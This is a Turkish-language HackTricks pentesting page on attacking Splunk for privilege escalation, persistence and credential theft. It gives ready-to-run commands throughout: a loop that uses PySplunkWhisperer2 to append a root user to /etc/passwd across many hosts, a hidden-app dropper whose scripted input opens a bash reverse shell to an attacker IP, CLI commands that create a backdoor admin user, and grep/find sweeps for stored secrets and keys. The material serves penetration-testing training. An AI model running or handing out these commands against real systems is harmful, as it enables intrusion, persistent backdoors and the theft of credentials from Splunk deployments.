# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

Bir makineyi **dahili** veya **harici** olarak **enumerating** ederken **Splunk running** bulursanız (web UI için genellikle **8000**, management API için **8089**), geçerli kimlik bilgileri çoğu zaman app installation, scripted inputs veya management actions aracılığıyla **code execution** elde etmek için kullanılabilir. Splunk **root** olarak çalışıyorsa bu durum sıklıkla doğrudan **privilege escalation** ile sonuçlanır.

Yalnızca generic remote attack surface, enumeration veya app-upload RCE path bilgilerine ihtiyacınız varsa şuraya bakın:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Zaten **root** iseniz ve Splunk service yalnızca localhost üzerinde listening yapmıyorsa **Splunk password hashes** çalabilir, **encrypted secrets** kurtarabilir veya yerel olarak ya da birden fazla forwarder genelinde persistence sağlamak için **malicious app** gönderebilirsiniz.

## İlginç Local Files

Splunk veya Splunk Universal Forwarder çalıştıran bir host üzerinde erişim elde ettiğinizde, genellikle en ilgi çekici path'ler şunlardır:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Önemli artifact'lar:

- **`$SPLUNK_HOME/etc/passwd`**: yerel Splunk kullanıcıları ve parola hash'leri.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk'ın çeşitli `.conf` dosyalarında saklanan secret'ları şifrelemek için kullandığı anahtar.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: ilk admin bootstrap dosyası; golden image'larda ve provisioning hatalarında kullanışlıdır. `etc/passwd` zaten mevcutsa yok sayılır.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted input'ların genellikle etkinleştirildiği yer.
- **`$SPLUNK_HOME/etc/deployment-apps/`** veya **`$SPLUNK_HOME/etc/apps/`**: persistent bir app'i gizlemek veya halihazırda dağıtılanları incelemek için iyi yerler.

## Splunk Universal Forwarder Agent Exploit Özeti

Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) adresine bakın. Bu yalnızca bir özettir:

**Exploit genel görünümü:**
Splunk Universal Forwarder'ı (UF) hedefleyen bir exploit, **agent password** bilgisine sahip saldırganların agent'ı çalıştıran sistemlerde arbitrary code execute etmesine ve potansiyel olarak ortamın büyük bir bölümünü compromise etmesine olanak tanır.

**Neden çalışır:**

- UF management service genellikle **TCP 8089** üzerinde dışa açıktır.
- Saldırganlar API'ye authenticate olabilir ve forwarder'a **malicious app bundle** yüklemesini söyleyebilir.
- Aynı primitive yerel olarak **LPE**, uzaktan ise **RCE** için kullanılabilir.
- **SplunkWhisperer2** gibi public tooling, app bundle'ı otomatik olarak oluşturur ve payload'ları Linux hedeflerine uyarlayabilir.

**Password'ü geri almak için yaygın yöntemler:**

- Documentation, script'ler, share'ler veya deployment automation içinde cleartext credentials.
- `$SPLUNK_HOME/etc/passwd` içindeki password hash'leri ve ardından offline cracking.
- `user-seed.conf` gibi golden image'lar veya provisioning artıkları.

**Etki:**

- Her compromise edilmiş host üzerinde SYSTEM/root-level code execution.
- Persistent app'ler, backdoor'lar veya ransomware dağıtımı.
- Data forward edilmeden önce telemetry'yi devre dışı bırakma veya kurcalama.

**Exploitation için örnek command:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistence via Scripted Inputs or Malicious Apps

`root`/`splunk` olarak **filesystem write access** yetkiniz veya app yüklemek için authenticated access erişiminiz varsa, oldukça güvenilir bir persistence mechanism, **scripted input** içeren bir **custom app** bırakmaktır. Splunk'ın kendi documentation'ı, scripted input'ların bir app directory altında bulunmasını ve `inputs.conf` üzerinden etkinleştirilmesini bekler.

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Hızlı Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notlar:

- Aynı yöntem, `/opt/splunkforwarder/etc/apps/` kullanılarak **Universal Forwarder** üzerinde de çalışır.
- Saldırganlar, bariz şekilde kötü amaçlı bir app oluşturmak yerine meşru bir add-on'ı değiştirerek sıklıkla gizlenir.
- Bir **deployment server** üzerinde, `deployment-apps/` içine kötü amaçlı bir app yerleştirmek **fleet-wide persistence**'a dönüşür; çünkü forwarder'lar güncellenmiş app'leri sorgular, indirir ve uygulamak için çoğu zaman yeniden başlatılır.

## Credential Theft and Admin Takeover

Splunk'ın yerel dosyalarını okuyabiliyorsanız genellikle iki iyi hedef vardır: **Splunk admin erişimini** kurtarmak ve **şifrelenmiş service credential'ları** kurtarmak.

### Password hashes and local users

Splunk, yerel authentication verilerini `etc/passwd` içinde saklar. Deployment'a bağlı olarak bu dosyayı crack etmek, web UI ve management API için geçerli credential'ları kurtarabilir.

Zaten geçerli **admin** credential'larına sahipseniz ve Splunk **native** authentication backend kullanıyorsa persistence için doğrudan CLI kullanılabilir:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` ve şifrelenmiş değerler

Splunk, birden fazla yapılandırma dosyasında depolanan hassas değerleri korumak için `etc/auth/splunk.secret` dosyasını kullanır. Hem **secret** değerini hem de ilgili **`.conf` dosyalarını** ele geçirebilirseniz genellikle şunları kurtarabilir veya yeniden kullanabilirsiniz:

- `pass4SymmKey` gibi forwarder/indexer paylaşılan secret değerleri
- `sslPassword` gibi TLS private-key parolaları
- `bindDNPassword` gibi LDAP bind kimlik bilgileri

Bu, Splunk admin parolasının kendisi crack edilemese bile **lateral movement** için faydalıdır.

### `user-seed.conf` abuse

`user-seed.conf` yalnızca ilk başlatma sırasında veya `etc/passwd` mevcut olmadığında kullanılır. Bu nedenle çalışan bir sistemde daha az faydalıdır; ancak şu durumlarda oldukça ilgi çekicidir:

- ele geçirilmiş kurulum şablonları
- container imajları
- unattended provisioning iş akışları
- Splunk'ın otomatik olarak yeniden başlatıldığı appliance'lar

Bu durumlarda `splunk hash-passwd` ile oluşturulmuş bir `HASHED_PASSWORD` yerleştirmek, yeniden deployment sonrasında admin erişimini sessizce geri kazanmanızı sağlar.

## Splunk Queries Abuse

Daha fazla ayrıntı için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) adresine bakın.

Yakın zamanda kullanılan faydalı bir teknik, vulnerable Splunk Enterprise sürümlerinde **user-supplied XSLT** abuse ederek düşük ayrıcalıklı, authenticated bir hesabı **`splunk` kullanıcısı** olarak **OS command execution** elde edecek şekilde yükseltmektir.

High-level akış:

1. Splunk'a authenticate olun.
2. Preview/upload functionality üzerinden malicious bir **XSL** dosyası upload edin.
3. Splunk'ın search results'ı, **dispatch** directory içindeki bu uploaded stylesheet ile render etmesini sağlayın.
4. XSLT payload'ını, bir dosya yazmak veya Splunk'ın search pipeline'ı üzerinden execution tetiklemek için kullanın (örneğin `runshellscript` gibi internal functionality'ye ulaşarak).

Saldırı açısından önemli çıkarım, bu yolun **app upload gerektirmeyen post-auth RCE** sağlamasıdır. Linux'ta genellikle **`splunk`** hesabına erişim elde edersiniz. Bu hesap yine de değerlidir; çünkü çoğu zaman application tree'nin sahibidir, secret'ları okuyabilir ve shell access kaybedilse bile varlığını sürdüren persistent app'ler yerleştirebilir.

Exploitation sırasında kullanılan representative path:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk çok fazla ayrıcalıkla çalışıyorsa veya `splunk` kullanıcısının tehlikeli script'lere, yazılabilir servis birimlerine ya da hatalı `sudo` kurallarına erişimi varsa bu, net bir **LPE** zincirine dönüşür.

## Referanslar

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
